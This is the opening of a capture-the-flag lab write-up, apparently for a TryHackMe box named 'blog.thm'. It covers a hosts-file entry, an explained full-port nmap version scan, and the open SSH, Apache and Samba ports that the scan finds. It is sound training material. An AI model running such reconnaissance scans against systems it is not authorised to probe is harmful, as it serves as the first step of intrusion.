# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx blog.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV blog.thm
```

we got these open ports
```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
